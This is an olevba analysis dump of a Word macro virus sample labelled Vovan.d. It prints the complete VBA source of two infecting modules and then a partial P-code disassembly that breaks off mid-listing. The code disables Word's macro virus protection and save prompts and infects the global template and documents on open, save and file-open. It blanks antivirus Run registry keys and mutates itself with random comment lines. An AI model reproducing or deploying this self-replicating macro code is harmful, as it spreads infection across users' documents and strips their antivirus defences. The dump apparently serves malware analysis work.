olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Vovan.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Vovan.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
krypton:
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0
Application.ScreenUpdating = 0
If ActiveDocument.ReadOnly = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then NTinf = True
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then ATinf = True
If NTinf = True And ATinf = True Then End
If NormalTemplate.VBProject.VBComponents(1).Name = "krypton" Then End
If ActiveDocument.VBProject.VBComponents(1).Name = "krypton" Then End
If NTinf = False Then
Set JI = NormalTemplate.VBProject.VBComponents(1).CodeModule
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Sub AutoExec()"
.replaceline 138, "Sub AutoOpen()"
.replaceline 152, "Sub FileSave()"
.replaceline 160, "Sub FileSaveAs()"
.replaceline 168, "Sub ViewVBcode()"
.replaceline 170, "Sub ToolsMacro()"
.replaceline 172, "Sub AutoExit()"
.replaceline 176, "Sub ToolsOptions()"
.replaceline 182, "Sub Mutation()"
.replaceline 193, "Sub xxx()"
.replaceline 204, "Sub Antigen()"
CI = .Lines(1, .CountOfLines)
End With
With JI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Private Sub aaa()"
.replaceline 138, "Private Sub bbb()"
.replaceline 152, "Private Sub ccc()"
.replaceline 160, "Private Sub ddd()"
.replaceline 168, "Private Sub eee()"
.replaceline 170, "Private Sub fff()"
.replaceline 172, "Private Sub ggg()"
.replaceline 176, "Private Sub hhh()"
.replaceline 182, "Private Sub iii()"
.replaceline 193, "Private Sub kkk()"
.replaceline 204, "Private Sub lll()"
CI = .Lines(1, .CountOfLines)
End With
End If
If Document = False Then
Set HI = ActiveDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Private Sub aaa()"
.replaceline 138, "Private Sub bbb()"
.replaceline 152, "Private Sub ccc()"
.replaceline 160, "Private Sub ddd()"
.replaceline 168, "Private Sub eee()"
.replaceline 170, "Private Sub fff()"
.replaceline 172, "Private Sub ggg()"
.replaceline 176, "Private Sub hhh()"
.replaceline 182, "Private Sub iii()"
.replaceline 193, "Private Sub kkk()"
.replaceline 204, "Private Sub lll()"
CI = .Lines(1, .CountOfLines)
End With
With HI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Sub AutoExec()"
.replaceline 138, "Sub AutoOpen()"
.replaceline 152, "Sub FileSave()"
.replaceline 160, "Sub FileSaveAs()"
.replaceline 168, "Sub ViewVBcode()"
.replaceline 170, "Sub ToolsMacro()"
.replaceline 172, "Sub AutoExit()"
.replaceline 176, "Sub ToolsOptions()"
.replaceline 182, "Sub Mutation()"
.replaceline 193, "Sub xxx()"
.replaceline 204, "Sub Antigen()"
End With
End If
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.Name = ActiveDocument.FullName Then End
If ActiveDocument.Saved = True Then GoTo 1 Else GoTo 2
1: Call Document_Open
2: ActiveDocument.Close
End Sub
Private Sub Document_New(): On Error Resume Next
Dim H: Randomize: H = Int((2 * Rnd) + 1)
If H = 1 Then GoTo 1
If H = 2 Then End
1: With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 193, "Sub FileOpen()": End With
Dim V: Randomize: V = Int((2 * Rnd) + 1): If V = 1 Then Call Mutation Else Call Antigen
Open "krypton.bas" For Output As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "krypton" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import ("krypton.bas")
Kill "krypton.bas"
Set ND = NormalTemplate.VBProject.VBComponents("krypton").CodeModule
With ThisDocument.VBProject.VBComponents(1).CodeModule
VC = .Lines(1, .CountOfLines)
End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
Set SS = NormalTemplate.VBProject.VBComponents(1).CodeModule
With SS
.DeleteLines 1, .CountOfLines
End With
End Sub
Private Sub aaa()
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
On Error GoTo 1
With NormalTemplate.VBProject.VBComponents("krypton").CodeModule
.replaceline 193, "Sub xxx()": End With: Dim R: Randomize: R = Int((2 * Rnd) + 1): If R = 1 Then Call Mutation Else Call Antigen
Set ND = ThisDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents("krypton").CodeModule
VC = .Lines(1, .CountOfLines): End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
Application.OrganizerDelete NormalTemplate.FullName, "krypton", wdOrganizerObjectProjectItems
1: End Sub
Private Sub bbb()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0
Application.ScreenUpdating = 0
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then End
If NormalTemplate.VBProject.VBComponents(1).Name = "krypton" Then End
Dim S: Randomize: S = Int((2 * Rnd) + 1): If S = 1 Then Call Mutation Else Call Antigen
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End Sub
Private Sub ccc()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 1
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
Dim P: Randomize: P = Int((2 * Rnd) + 1): If P = 1 Then Call Mutation Else Call Antigen
1: ActiveDocument.Save
End Sub
Private Sub ddd()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 1
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
Dim T: Randomize: T = Int((2 * Rnd) + 1): If T = 1 Then Call Mutation Else Call Antigen
1: Dialogs(wdDialogFileSaveAs).Show
End Sub
Private Sub eee()
End Sub
Private Sub fff()
End Sub
Private Sub ggg()
Options.VirusProtection = 1
Dim W: Randomize: W = Int((2 * Rnd) + 1): If W = 1 Then Call Mutation Else Call Antigen
End Sub
Private Sub hhh()
On Error Resume Next: Options.VirusProtection = 1: Options.SaveNormalPrompt = 1
If Dialogs(wdDialogToolsOptions).Show Then
End If
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
End Sub
Private Sub iii()
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVPCC") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "AVPCC Service") = ""
jXjX = Int(Rnd() * 15 + 1)
For Mutagen = 1 To jXjX
ZjZj = Application.VBE.ActiveVBProject.VBComponents("krypton").CodeModule.CountOfLines
a = Rnd * 455: b = Rnd * 80: C = Rnd * 160: D = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("krypton").CodeModule.InsertLines ZjZj, "'" & a & vbTab & b & vbTab & C & vbTab & D & vbTab & e
Next Mutagen
End Sub
Private Sub kkk()
On Error Resume Next: WordBasic.DisableAutoMacros
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Application.ScreenUpdating = 0: Application.ShowVisualBasicEditor = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then End
If ActiveDocument.VBProject.VBComponents(1).Name = "krypton" Then End
Dim C: Randomize: C = Int((2 * Rnd) + 1): If C = 1 Then Call Mutation Else Call Antigen
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Private Sub lll()
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 2
1: For O = 1 To ActiveDocument.VBProject.VBComponents("krypton").CodeModule.CountOfLines
e = Mid(ActiveDocument.VBProject.VBComponents("krypton").CodeModule.Lines(O, 1), 1, 1)
If e = "'" Then ActiveDocument.VBProject.VBComponents("krypton").CodeModule.DeleteLines O, 1
Next O
GoTo 3
2: For O = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
e = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(O, 1), 1, 1)
If e = "'" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines O, 1
Next O
3:
End Sub
Rem
Rem                  MMM            MMMMMMMMM                 MM
Rem                MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
Rem                 MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
Rem                  MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
Rem                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
Rem                  MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
Rem                  MMM        MMMMMMMMMMMMM           MMMMMMMMMM
Rem                  MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
Rem                   MM         MMMMMMMM               M  MMMMMMM
Rem                   MM        MMMMMMMMM             MMM   MMMMMM
Rem                            MMMMMMMMMMMMMM      MMMMM    MMMMMM
Rem                   MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
Rem                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
Rem                 MMMMMMMMMM                                MM
Rem
Rem                               CLASS<----->MODULE

'163,9571   66,07912    8,951941    76,12047    16,61564
'155.1797   65.39644    44.92301    27.13999    46.47184
'350.3782   27.91799    66.89333    176.529 20.60163
'184.6814   37.85266    62.08024    131.5903    6.205057
'274.4437   29.69988    145.8309    80.11719    15.62759
'209.5493   14.70623    41.1346 44.18858    41.31762
'363.4363   29.87785    42.04824    169.5462    14.73613
'329.082    71.70483    38.84999    7.887883    39.53069
'435.7095   29.89048    153.1638    71.76006    21.3161
'196.4927   44.89401    80.20324    114.1727    27.57722
'105.5832   43.79846    91.06363    141.7999    35.20638
'388.5746   48.1562 13.14965    163.2252    15.8997
'152.1205   56.29233    133.8543    72.46186    36.64165
'350.4249   77.31232    44.0137 106.9814    4.320534
'313.6666   26.01284    5.941448    41.53357    4.842751
'380.0715   43.28584    138.5046    .7039404    46.09143

-------------------------------------------------------------------------------
VBA MACRO krypton.bas 
in file: ./Virus.MSWord.Vovan.d - OLE stream: 'Macros/VBA/krypton'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
krypton:
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0
Application.ScreenUpdating = 0
If ActiveDocument.ReadOnly = 1 Then
SetAttr ActiveDocument.FullName, 0
ActiveDocument.Reload
End If
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then NTinf = True
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then ATinf = True
If NTinf = True And ATinf = True Then End
If NormalTemplate.VBProject.VBComponents(1).Name = "krypton" Then End
If ActiveDocument.VBProject.VBComponents(1).Name = "krypton" Then End
If NTinf = False Then
Set JI = NormalTemplate.VBProject.VBComponents(1).CodeModule
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Sub AutoExec()"
.replaceline 138, "Sub AutoOpen()"
.replaceline 152, "Sub FileSave()"
.replaceline 160, "Sub FileSaveAs()"
.replaceline 168, "Sub ViewVBcode()"
.replaceline 170, "Sub ToolsMacro()"
.replaceline 172, "Sub AutoExit()"
.replaceline 176, "Sub ToolsOptions()"
.replaceline 182, "Sub Mutation()"
.replaceline 193, "Sub xxx()"
.replaceline 204, "Sub Antigen()"
CI = .Lines(1, .CountOfLines)
End With
With JI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With ActiveDocument.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Private Sub aaa()"
.replaceline 138, "Private Sub bbb()"
.replaceline 152, "Private Sub ccc()"
.replaceline 160, "Private Sub ddd()"
.replaceline 168, "Private Sub eee()"
.replaceline 170, "Private Sub fff()"
.replaceline 172, "Private Sub ggg()"
.replaceline 176, "Private Sub hhh()"
.replaceline 182, "Private Sub iii()"
.replaceline 193, "Private Sub kkk()"
.replaceline 204, "Private Sub lll()"
CI = .Lines(1, .CountOfLines)
End With
End If
If Document = False Then
Set HI = ActiveDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Private Sub aaa()"
.replaceline 138, "Private Sub bbb()"
.replaceline 152, "Private Sub ccc()"
.replaceline 160, "Private Sub ddd()"
.replaceline 168, "Private Sub eee()"
.replaceline 170, "Private Sub fff()"
.replaceline 172, "Private Sub ggg()"
.replaceline 176, "Private Sub hhh()"
.replaceline 182, "Private Sub iii()"
.replaceline 193, "Private Sub kkk()"
.replaceline 204, "Private Sub lll()"
CI = .Lines(1, .CountOfLines)
End With
With HI
.DeleteLines 1, .CountOfLines
.InsertLines 1, CI
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 123, "Sub AutoExec()"
.replaceline 138, "Sub AutoOpen()"
.replaceline 152, "Sub FileSave()"
.replaceline 160, "Sub FileSaveAs()"
.replaceline 168, "Sub ViewVBcode()"
.replaceline 170, "Sub ToolsMacro()"
.replaceline 172, "Sub AutoExit()"
.replaceline 176, "Sub ToolsOptions()"
.replaceline 182, "Sub Mutation()"
.replaceline 193, "Sub xxx()"
.replaceline 204, "Sub Antigen()"
End With
End If
ActiveDocument.SaveAs ActiveDocument.FullName
End Sub
Private Sub Document_Close()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.Name = ActiveDocument.FullName Then End
If ActiveDocument.Saved = True Then GoTo 1 Else GoTo 2
1: Call Document_Open
2: ActiveDocument.Close
End Sub
Private Sub Document_New(): On Error Resume Next
Dim H: Randomize: H = Int((2 * Rnd) + 1)
If H = 1 Then GoTo 1
If H = 2 Then End
1: With NormalTemplate.VBProject.VBComponents(1).CodeModule
.replaceline 193, "Sub FileOpen()": End With
Dim V: Randomize: V = Int((2 * Rnd) + 1): If V = 1 Then Call Mutation Else Call Antigen
Open "krypton.bas" For Output As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "krypton" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import ("krypton.bas")
Kill "krypton.bas"
Set ND = NormalTemplate.VBProject.VBComponents("krypton").CodeModule
With ThisDocument.VBProject.VBComponents(1).CodeModule
VC = .Lines(1, .CountOfLines)
End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
Set SS = NormalTemplate.VBProject.VBComponents(1).CodeModule
With SS
.DeleteLines 1, .CountOfLines
End With
End Sub
Sub AutoExec()
Application.EnableCancelKey = 0: Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
On Error GoTo 1
With NormalTemplate.VBProject.VBComponents("krypton").CodeModule
.replaceline 193, "Sub xxx()": End With: Dim R: Randomize: R = Int((2 * Rnd) + 1): If R = 1 Then Call Mutation Else Call Antigen
Set ND = ThisDocument.VBProject.VBComponents(1).CodeModule
With NormalTemplate.VBProject.VBComponents("krypton").CodeModule
VC = .Lines(1, .CountOfLines): End With
With ND
.DeleteLines 1, .CountOfLines
.InsertLines 1, VC
End With
Application.OrganizerDelete NormalTemplate.FullName, "krypton", wdOrganizerObjectProjectItems
1: End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ShowVisualBasicEditor = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
ActiveDocument.ReadOnlyRecommended = 0
Application.ScreenUpdating = 0
If NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then End
If NormalTemplate.VBProject.VBComponents(1).Name = "krypton" Then End
Dim S: Randomize: S = Int((2 * Rnd) + 1): If S = 1 Then Call Mutation Else Call Antigen
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
NormalTemplate.Save
End Sub
Sub FileSave()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 1
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
Dim P: Randomize: P = Int((2 * Rnd) + 1): If P = 1 Then Call Mutation Else Call Antigen
1: ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Application.ScreenUpdating = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 1
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
Dim T: Randomize: T = Int((2 * Rnd) + 1): If T = 1 Then Call Mutation Else Call Antigen
1: Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub ViewVBcode()
End Sub
Sub ToolsMacro()
End Sub
Sub AutoExit()
Options.VirusProtection = 1
Dim W: Randomize: W = Int((2 * Rnd) + 1): If W = 1 Then Call Mutation Else Call Antigen
End Sub
Sub ToolsOptions()
On Error Resume Next: Options.VirusProtection = 1: Options.SaveNormalPrompt = 1
If Dialogs(wdDialogToolsOptions).Show Then
End If
Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
End Sub
Sub Mutation()
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "AVPCC") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices", "AVPCC Service") = ""
jXjX = Int(Rnd() * 15 + 1)
For Mutagen = 1 To jXjX
ZjZj = Application.VBE.ActiveVBProject.VBComponents("krypton").CodeModule.CountOfLines
a = Rnd * 455: b = Rnd * 80: C = Rnd * 160: D = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("krypton").CodeModule.InsertLines ZjZj, "'" & a & vbTab & b & vbTab & C & vbTab & D & vbTab & e
Next Mutagen
End Sub
Sub FileOpen()
On Error Resume Next: WordBasic.DisableAutoMacros
Dialogs(wdDialogFileOpen).Show
WordBasic.EnableAutoMacros
Application.ScreenUpdating = 0: Application.ShowVisualBasicEditor = 0
If ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 1) = "krypton:" Then End
If ActiveDocument.VBProject.VBComponents(1).Name = "krypton" Then End
Dim C: Randomize: C = Int((2 * Rnd) + 1): If C = 1 Then Call Mutation Else Call Antigen
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="krypton", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub Antigen()
On Error Resume Next
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "krypton:" Then GoTo 2
1: For O = 1 To ActiveDocument.VBProject.VBComponents("krypton").CodeModule.CountOfLines
e = Mid(ActiveDocument.VBProject.VBComponents("krypton").CodeModule.Lines(O, 1), 1, 1)
If e = "'" Then ActiveDocument.VBProject.VBComponents("krypton").CodeModule.DeleteLines O, 1
Next O
GoTo 3
2: For O = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
e = Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(O, 1), 1, 1)
If e = "'" Then ThisDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines O, 1
Next O
3:
End Sub
Rem
Rem                  MMM            MMMMMMMMM                 MM
Rem                MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM
Rem                 MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM
Rem                  MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM
Rem                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
Rem                  MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
Rem                  MMM        MMMMMMMMMMMMM           MMMMMMMMMM
Rem                  MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM
Rem                   MM         MMMMMMMM               M  MMMMMMM
Rem                   MM        MMMMMMMMM             MMM   MMMMMM
Rem                            MMMMMMMMMMMMMM      MMMMM    MMMMMM
Rem                   MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM
Rem                  MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM
Rem                 MMMMMMMMMM                                MM
Rem
Rem                               CLASS<----->MODULE

'163,9571   66,07912    8,951941    76,12047    16,61564

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Vovan.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 17808 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Label krypton 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #5:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #9:
' 	Ld ActiveDocument 
' 	MemLd ReadOnly 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #10:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0000 
' 	ArgsCall SetAttr 0x0002 
' Line #11:
' 	Ld ActiveDocument 
' 	ArgsMemCall Reload 0x0000 
' Line #12:
' 	EndIfBlock 
' Line #13:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTinf 
' 	EndIf 
' Line #14:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0008 "krypton:"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ATinf 
' 	EndIf 
' Line #15:
' 	Ld NTinf 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ATinf 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "krypton"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "krypton"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	End 
' 	EndIf 
' Line #18:
' 	Ld NTinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set JI 
' Line #20:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #21:
' 	LitDI2 0x007B 
' 	LitStr 0x000E "Sub AutoExec()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #22:
' 	LitDI2 0x008A 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #23:
' 	LitDI2 0x0098 
' 	LitStr 0x000E "Sub FileSave()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #24:
' 	LitDI2 0x00A0 
' 	LitStr 0x0010 "Sub FileSaveAs()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #25:
' 	LitDI2 0x00A8 
' 	LitStr 0x0010 "Sub ViewVBcode()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #26:
' 	LitDI2 0x00AA 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #27:
' 	LitDI2 0x00AC 
' 	LitStr 0x000E "Sub AutoExit()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #28:
' 	LitDI2 0x00B0 
' 	LitStr 0x0012 "Sub ToolsOptions()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #29:
' 	LitDI2 0x00B6 
' 	LitStr 0x000E "Sub Mutation()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #30:
' 	LitDI2 0x00C1 
' 	LitStr 0x0009 "Sub xxx()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #31:
' 	LitDI2 0x00CC 
' 	LitStr 0x000D "Sub Antigen()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #32:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St CI 
' Line #33:
' 	EndWith 
' Line #34:
' 	StartWithExpr 
' 	Ld JI 
' 	With 
' Line #35:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld CI 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #37:
' 	EndWith 
' Line #38:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' 	LitDI2 0x007B 
' 	LitStr 0x0011 "Private Sub aaa()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #40:
' 	LitDI2 0x008A 
' 	LitStr 0x0011 "Private Sub bbb()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #41:
' 	LitDI2 0x0098 
' 	LitStr 0x0011 "Private Sub ccc()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #42:
' 	LitDI2 0x00A0 
' 	LitStr 0x0011 "Private Sub ddd()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #43:
' 	LitDI2 0x00A8 
' 	LitStr 0x0011 "Private Sub eee()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #44:
' 	LitDI2 0x00AA 
' 	LitStr 0x0011 "Private Sub fff()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #45:
' 	LitDI2 0x00AC 
' 	LitStr 0x0011 "Private Sub ggg()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #46:
' 	LitDI2 0x00B0 
' 	LitStr 0x0011 "Private Sub hhh()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #47:
' 	LitDI2 0x00B6 
' 	LitStr 0x0011 "Private Sub iii()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #48:
' 	LitDI2 0x00C1 
' 	LitStr 0x0011 "Private Sub kkk()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #49:
' 	LitDI2 0x00CC 
' 	LitStr 0x0011 "Private Sub lll()"
' 	ArgsMemCallWith replaceline 0x0002 
' Line #50:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
